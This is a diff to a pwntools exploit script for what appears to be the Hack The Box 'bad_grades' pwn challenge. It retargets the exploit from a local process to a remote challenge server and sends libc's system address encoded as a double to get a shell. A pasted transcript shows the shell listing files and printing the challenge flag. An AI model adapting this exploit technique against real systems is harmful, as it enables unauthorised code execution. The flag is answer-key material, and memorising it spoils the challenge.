@@ -43,10 +43,10 @@ elf = ELF('./bad_grades')
 context.arch = 'amd64'
 
 rop = ROP(elf)
-io = process('./bad_grades')
+#io = process('./bad_grades')
 
-ip, port = "127.0.0.1", 1234
-#io = remote(ip, port)
+ip, port = "142.93.37.215", 30185
+io = remote(ip, port)
 
 io.sendlineafter('> ', '2')
 
@@ -87,3 +87,12 @@ io.sendline(hex_to_double(libc.symbols['system']))
 io.recvuntil('\n')
 io.interactive()
 
+'''
+$ ls
+bad_grades
+flag.txt
+libc.so.6
+run_challenge.sh
+$ cat flag.txt
+HTB{c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5}
+'''
